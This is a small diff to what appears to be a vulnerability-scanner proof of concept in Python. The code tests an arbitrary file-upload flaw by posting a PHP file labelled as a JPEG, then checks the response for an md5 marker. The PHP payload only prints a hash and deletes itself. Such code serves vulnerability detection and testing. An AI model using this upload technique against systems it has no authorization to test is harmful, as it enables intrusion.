@@ -56,7 +56,7 @@ class Poc(ABPoc):
                 '1.php', '<?php echo md5(0x2333333);unlink(__FILE__);?>', 'image/jpeg')}
             data = {'submitBtn': 'Upload'}
 
-            requests.post(vulurl, files=payload, data=data).content
+            requests.post(vulurl, files=payload, data=data).text
             resp = requests.get(testurl)
             if '5a8adb32edd60e0cfb459cfb38093755' in resp:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
